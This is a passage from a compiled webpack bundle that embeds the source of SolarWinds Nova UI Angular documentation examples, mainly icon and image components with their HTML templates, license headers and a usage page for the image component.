LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\n\nimport { IconService } from "./../../../../../../src/lib/icon/icon.service";\n\n@Component({\n    selector: "nui-icon-list-example",\n    templateUrl: "./icon-list.example.component.html",\n})\nexport class IconListExampleComponent implements OnInit {\n    public icons: any[];\n    public categories: any[];\n\n    constructor(private iconService: IconService) {}\n\n    public ngOnInit(): void {\n        this.icons = this.iconService.icons;\n        this.categories = this.getCategories(this.icons);\n    }\n\n    private getCategories(icons: any[]) {\n        const categories = [];\n        for (const icon of icons) {\n            if (categories.indexOf(icon.category) === -1) {\n                categories.push(icon.category);\n            }\n        }\n        return categories;\n    }\n}\n'},13292:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon icon="add" iconSize="small" id="nui-demo-icon-small"></nui-icon>\n<nui-icon icon="add" id="nui-demo-icon-default-size"></nui-icon>\n<nui-icon\n    icon="add"\n    iconSize="medium"\n    id="nui-demo-icon-medium-size"\n></nui-icon>\n'},12956:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-icon-size-example",\n    templateUrl: "./icon-size.example.component.html",\n})\nexport class IconSizeExampleComponent {}\n'},59232:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon\n    icon="add"\n    [status]="status"\n    id="nui-demo-icon-with-status-up"\n></nui-icon>\n'},48640:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IconStatus } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-icon-status-example",\n    templateUrl: "./icon-status.example.component.html",\n})\nexport class IconStatusExampleComponent {\n    status: IconStatus = IconStatus.Up;\n}\n'},61656:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="ml-4">\n    <div>\n        <h3>Basic icon usage</h3>\n        <nui-icon\n            icon="add"\n            iconHoverColor="gray"\n            id="nui-icon-test-basic-usage"\n        ></nui-icon>\n        <hr />\n    </div>\n\n    <div>\n        <h3>Icon with Differrent Sizes</h3>\n        <nui-icon\n            class="pr-2"\n            icon="add"\n            iconSize="small"\n            id="nui-icon-test-small-size"\n        ></nui-icon>\n        <nui-icon\n            class="pr-2"\n            icon="add"\n            id="nui-icon-test-default-size"\n        ></nui-icon>\n        <nui-icon\n            class="pr-2"\n            icon="add"\n            iconSize="medium"\n            id="nui-icon-test-medium-size"\n        ></nui-icon>\n        <hr />\n    </div>\n\n    <div>\n        <h3>Icon with Color</h3>\n        <div class="d-flex flex-row">\n            <div class="d-flex flex-column pr-5">\n                orange\n                <nui-icon\n                    icon="add"\n                    iconColor="orange"\n                    id="nui-icon-test-color"\n                ></nui-icon>\n            </div>\n            <div class="d-flex flex-column pr-5">\n                light-blue\n                <nui-icon\n                    icon="add"\n                    iconColor="light-blue"\n                    id="nui-icon-test-color"\n                ></nui-icon>\n            </div>\n            <div class="d-flex flex-column pr-5">\n                primary-blue\n                <nui-icon\n                    icon="add"\n                    iconColor="primary-blue"\n                    id="nui-icon-test-color"\n                ></nui-icon>\n            </div>\n            <div class="d-flex flex-column pr-5">\n                gray\n                <nui-icon\n                    icon="add"\n                    iconColor="gray"\n                    id="nui-icon-test-color"\n                ></nui-icon>\n            </div>\n            <div class="d-flex flex-column pr-5">\n                disabled-gray\n                <nui-icon\n                    icon="add"\n                    iconColor="disabled-gray"\n                    id="nui-icon-test-color"\n                ></nui-icon>\n            </div>\n        </div>\n        <hr />\n    </div>\n\n    <div>\n        <h3>Icon with Status</h3>\n\n        <div class="d-flex flex-row">\n            <div\n                class="d-flex flex-column pr-5"\n                *ngFor="let status of iconStatuses"\n            >\n                {{ status\n                }}<nui-icon icon="add" status="{{ status }}"></nui-icon>\n            </div>\n        </div>\n        <hr />\n    </div>\n\n    <div>\n        <h3>Icon with Child Status</h3>\n\n        <div class="d-flex flex-row">\n            <div\n                class="d-flex flex-column pr-5"\n                *ngFor="let status of iconStatuses"\n            >\n                {{ status\n                }}<nui-icon\n                    icon="add"\n                    status="up"\n                    childStatus="{{ status }}"\n                ></nui-icon>\n            </div>\n        </div>\n        <hr />\n    </div>\n\n    <div>\n        <h3>Icon with Text Alignment</h3>\n        <div class="d-inline-flex align-items-center">\n            <nui-icon\n                icon="printer"\n                status="critical"\n                childStatus="down"\n            ></nui-icon>\n            Managed entity name\n        </div>\n        <hr />\n    </div>\n\n    <div>\n        <h3>Icon with Counter</h3>\n        <nui-icon\n            icon="email"\n            [counter]="6"\n            id="nui-icon-test-with-counter"\n        ></nui-icon>\n        <hr />\n    </div>\n</div>\n'},89768:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\n\nimport { IconStatus, IconCategory } from "@nova-ui/bits";\n\nimport {\n    icons as iconsData,\n    ITypedIconData,\n} from "../../../../../../src/lib/icon/icons";\n\n@Component({\n    selector: "nui-icon-visual-test",\n    templateUrl: "./icon-visual-test.component.html",\n})\nexport class IconVisualTestComponent implements OnInit {\n    public icons: ITypedIconData[];\n    public categories: IconCategory[];\n    public iconStatuses: string[] = Object.values(IconStatus);\n\n    public ngOnInit(): void {\n        this.icons = iconsData;\n        this.categories = this.getCategories(iconsData);\n    }\n\n    public getCategories(icons: ITypedIconData[]): IconCategory[] {\n        return Array.from(new Set(icons.flatMap((icon) => icon.category)));\n    }\n}\n'},60954:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-inline-flex align-items-center">\n    <nui-icon\n        icon="printer"\n        [status]="status"\n        [childStatus]="childStatus"\n    ></nui-icon>\n    <span i18n>Managed entity name</span>\n</div>\n'},79078:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IconStatus } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-icon-with-text-example",\n    templateUrl: "./icon-with-text.example.component.html",\n})\nexport class IconWithTextExampleComponent {\n    status: IconStatus = IconStatus.Up;\n    childStatus: IconStatus = IconStatus.Sleep;\n}\n'},6659:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiIconModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    IconBasicExampleComponent,\n    IconChildStatusExampleComponent,\n    IconColorExampleComponent,\n    IconCounterExampleComponent,\n    IconDocsExampleComponent,\n    IconHoverExampleComponent,\n    IconListExampleComponent,\n    IconSizeExampleComponent,\n    IconStatusExampleComponent,\n    IconVisualTestComponent,\n    IconWithTextExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: IconDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "icon-visual-test",\n        component: IconVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiIconModule,\n        NuiExpanderModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        IconBasicExampleComponent,\n        IconChildStatusExampleComponent,\n        IconColorExampleComponent,\n        IconCounterExampleComponent,\n        IconDocsExampleComponent,\n        IconListExampleComponent,\n        IconSizeExampleComponent,\n        IconStatusExampleComponent,\n        IconHoverExampleComponent,\n        IconWithTextExampleComponent,\n        IconVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("icon"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class IconModule {}\n'},70838:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./icon-basic/icon-basic.example.component";\nexport * from "./icon-docs/icon-docs.example.component";\nexport * from "./icon-color/icon-color.example.component";\nexport * from "./icon-list/icon-list.example.component";\nexport * from "./icon-size/icon-size.example.component";\nexport * from "./icon-status/icon-status.example.component";\nexport * from "./icon-hover/icon-hover.example.component";\nexport * from "./icon-counter/icon-counter.example.component";\nexport * from "./icon-child-status/icon-child-status.example.component";\nexport * from "./icon-with-text/icon-with-text.example.component";\nexport * from "./icon-visual-test/icon-visual-test.component";\n'},28530:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-image image="no-data-to-show"> </nui-image>\n'},92558:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-basic-example",\n    templateUrl: "./image-basic.example.component.html",\n})\nexport class ImageBasicExampleComponent {}\n'},75918:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-image&gt;</code>, as the name implies, allows you to display\n    an image within your html. Settings for\n    <code>&lt;nui-image&gt;</code> include size, alignment, and margins.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiImageModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use <code>&lt;nui-image&gt;</code> you can set the\n    <code>image</code> input to the id of one of the available images provided\n    as part of Nova. See the <strong>Available Images</strong> section on this\n    page. Alternately, you can set the <code>image</code> input to an external\n    URL.\n</p>\n<nui-example-wrapper filenamePrefix="image-basic" exampleTitle="Basic Usage">\n    <nui-image-basic-example></nui-image-basic-example>\n</nui-example-wrapper>\n\n<h2>Changing Image\'s Size</h2>\n<p>\n    Setting the <code>autoFill</code> input to <code>true</code> changes the\n    pre-set <code>svg</code> height and width values to 100%, which allows the\n    <code>svg</code> to properly fill the parent container and conform to its\n    size.\n</p>\n<p>\n    The <code>autoFill</code> only applies to <code>svg</code> image types. It\n    will not do any effect to the rest of images used.\n</p>\n<p>\n    The <code>height</code> and <code>width</code> inputs allow manual control\n    of the image container\'s dimensions. Together, these three inputs allow you\n    to properly resize the <code>nui-image</code> component using either\n    <code>px</code> or <code>%</code> units.\n</p>\n<p>\n    If not set, default value for <code>width</code> is <code>auto</code>. The\n    <code>height</code>, if not set, does not have a default value, therefore,\n    it\'s not applied by default. The user has to set its value explicitly, if\n    needed.\n</p>\n<nui-example-wrapper\n    filenamePrefix="image-width-height-and-autoFill"\n    exampleTitle="Custom Image Size"\n>\n    <nui-image-width-height-autofill-example></nui-image-width-height-autofill-example>\n</nui-example-wrapper>\n\n<h2>Custom Alignment</h2>\n<p>\n    <code>&lt;nui-image&gt;</code> can be aligned to the left or the right by\n    passing the either "left" or "right" to the <code>float</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="image-float"\n    exampleTitle="Custom Alignment"\n>\n    <nui-image-float-example></nui-image-float-example>\n</nui-example-wrapper>\n<h2>Custom Margin</h2>\n<p>\n    <code>&lt;nui-image&gt;</code> can have custom margins. Available values\n    are: \'centered\', \'small\', \'large\'. By default no margins are used.\n</p>\n<nui-example-wrapper filenamePrefix="image-margin" exampleTitle="Custom Margin">\n    <nui-image-margin-example></nui-image-margin-example>\n</nui-example-wrapper>\n<h2>Opacity</h2>\n<p>\n    <code>&lt;nui-image&gt;</code> can be "watermarked" to have 30% opacity. By\n    default the image does not have any opacity.\n</p>\n<nui-example-wrapper\n    filenamePrefix="image-watermarked"\n    exampleTitle="Watermarked Image"\n>\n    <nui-image-watermarked-example></nui-image-watermarked-example>\n</nui-example-wrapper>\n<h2>External Source</h2>\n<p>\n    To load an image from an external source, set the <code>image</code> input\n    either to the image\'s url or to an object of type\n    <code\n        ><a href="../interfaces/IImagesPresetItem.html" target="_blank"\n            >IImagesPresetItem</a\n        ></code\n    >\n    in which the code property is an svg element. The example below demonstrates\n    a hard-coded object for its <code>IImagesPresetItem</code>, but in a\n    real-world situation the entire object or the svg contained within it would\n    likely originate from an external source.\n</p>\n<nui-example-wrapper\n    filenamePrefix="image-external"\n    exampleTitle="Image from external repo"\n>\n    <nui-image-external-example></nui-image-external-example>\n</nui-example-wrapper>\n<h2>Available Images</h2>\n<p>\n    Nova provides a limited set of images out of the box. To use them, set the\n    <code>image</code> input on the <code>nui-image</code> element using the\n    name shown underneath each of images below.\n</p>\n<nui-example-wrapper\n    filenamePrefix="image-list"\n    exampleTitle="Available Images"\n>\n    <nui-image-list-example></nui-image-list-example>\n</nui-example-wrapper>\n'},89930:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-image-docs-example",\n    templateUrl: "./image-docs.example.component.html",\n})\nexport class ImageDocsExampleComponent {}\n'},59794:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex">\n    <div class="mr-5">\n        <div class="mb-5"><em>URL</em></div>\n        <nui-image\n            [image]="bookCover.url"\n            [description]="bookCover.description"\n            width="200px"\n        ></nui-image>\n    </div>\n    <div>\n        <div class="mb-5"><em>Object with SVG</em></div>\n        <nui-image [image]="imageObject" width="200px"></nui-image>\n    </div>\n</div>\n'},32174:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the \"Software\"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from \"@angular/core\";\n\nimport { IImagesPresetItem } from \"@nova-ui/bits\";\n\n@Component({\n    selector: \"nui-image-external-example\",\n    templateUrl: \"./image-external.example.component.html\",\n})\nexport class ImageExternalExampleComponent {\n    public bookCover = {\n        url: \"https://imgc.allpostersimages.com/img/print/u-g-F8PQ9I0.jpg?w=550&h=550&p=0\",\n        description: \"Harry Potter book\",\n    };\n\n    public imageObject: IImagesPresetItem = {\n        svgFile: \"watermark-data.svg\",\n        name: \"no-data-to-show\",\n        brushType: \"filled\",\n        code: \"<svg width='169.5' height='116.09' viewBox='0 0 169.5 116.09'><defs><style aria-hidden='true'>.nui-image-watermark-data-1,.nui-image-watermark-data-2{fill:#707070;}.nui-image-watermark-data-1{fill-opacity:0.2;}.nui-image-watermark-data-2{fill-opacity:0.2;}.nui-image-watermark-data-3,.nui-image-watermark-data-6{fill:#fff;}.nui-image-watermark-data-3,.nui-image-watermark-data-5,.nui-image-watermark-data-6{stroke:#707070;}.nui-image-watermark-data-3,.nui-image-watermark-data-5{stroke-linecap:round;stroke-linejoin:round;}.nui-image-watermark-data-4{fill:#d5d5d5;}.nui-image-watermark-data-5{fill:none;}.nui-image-watermark-data-6{stroke-miterlimit:10;}</style></defs><title>empty-data</title><g id='empty-data'><path class='nui-image-watermark-data-1' d='M169.5,62.09c0-5-12.31-9-27.5-9s-27.5,4-27.5,9v45c0,5,12.31,9,27.5,9s27.5-4,27.5-9Z'/><polygon class='nui-image-watermark-data-2' points='144 24.47 93.77 5 74.5 12.47 124.73 31.94 144 24.47'/><polygon class='nui-image-watermark-data-2' points='55.23 5 5 24.47 24.27 31.94 74.5 12.47 55.23 5'/><polygon class='nui-image-watermark-data-2' points='124.73 31.94 124.5 32.03 124.5 31.85 74.5 12.47 24.5 31.85 24.5 32.03 24.27 31.94 5 39.41 24.5 46.97 24.5 78.88 74.5 98.26 124.5 78.88 124.5 46.97 144 39.41 124.73 31.94'/><polygon class='nui-image-watermark-data-3' points='120 27.44 120 74.38 70 93.76 20 74.38 20 27.44 70 7.97 120 27.44'/><polygon class='nui-image-watermark-data-4' points='70 7.97 120 27.44 70 46.76 20 27.44 70 7.97'/><line class='nui-image-watermark-data-5' x1='70' y1='93.59' x2='70' y2='8.18'/><polygon class='nui-image-watermark-data-3' points='70 7.97 120.23 27.44 139.5 19.97 89.27 0.5 70 7.97'/><polygon class='nui-image-watermark-data-3' points='70 7.97 19.77 27.44 0.5 19.97 50.73 0.5 70 7.97'/><polygon class='nui-image-watermark-data-3' points='70 46.91 120.23 27.44 139.5 34.91 89.27 54.38 70 46.91'/><polygon class='nui-image-watermark-data-3' points='70 46.91 19.77 27.44 0.5 34.91 50.73 54.38 70 46.91'/><path class='nui-image-watermark-data-6' d='M137.5,78.59c-15.19,0-27.5,4-27.5,9v15c0,5,12.31,9,27.5,9s27.5-4,27.5-9v-15C165,82.62,152.69,78.59,137.5,78.59Z'/><ellipse class='nui-image-watermark-data-6' cx='137.5' cy='87.59' rx='27.5' ry='9'/><path class='nui-image-watermark-data-6' d='M137.5,63.59c-15.19,0-27.5,4-27.5,9v15c0,5,12.31,9,27.5,9s27.5-4,27.5-9v-15C165,67.62,152.69,63.59,137.5,63.59Z'/><ellipse class='nui-image-watermark-data-6' cx='137.5' cy='72.59' rx='27.5' ry='9'/><path class='nui-image-watermark-data-6' d='M137.5,48.59c-15.19,0-27.5,4-27.5,9v15c0,5,12.31,9,27.5,9s27.5-4,27.5-9v-15C165,52.62,152.69,48.59,137.5,48.59Z'/><ellipse class='nui-image-watermark-data-6' cx='137.5' cy='57.59' rx='27.5' ry='9'/></g></svg>\",\n    };\n}\n"},16258:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p i18n>\n    <nui-image id="image-float" image="no-data-to-show" float="right">\n    </nui-image>\n    Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquam\n    exercitationem natus non? Amet architecto, asperiores dolor eligendi eum\n    fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n    voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing elit.\n    Aliquam exercitationem natus non? Amet architecto, asperiores dolor eligendi\n    eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n    voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing elit.\n    Aliquam exercitationem natus non? Amet architecto, asperiores dolor eligendi\n    eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n    voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing elit.\n    Aliquam exercitationem natus non? Amet architecto, asperiores dolor eligendi\n    eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n    voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing elit.\n    Aliquam exercitationem natus non? Amet architecto, asperiores dolor eligendi\n    eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n    voluptatem. Lorem ipsum dolor sit amet, consectetur adipisicing elit.\n    Aliquam exercitationem natus non? Amet architecto, asperiores dolor eligendi\n    eum fugit illum ipsum magni, nemo optio perspiciatis quaerat quidem rem, sit\n    voluptatem.\n</p>\n'},91326:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND 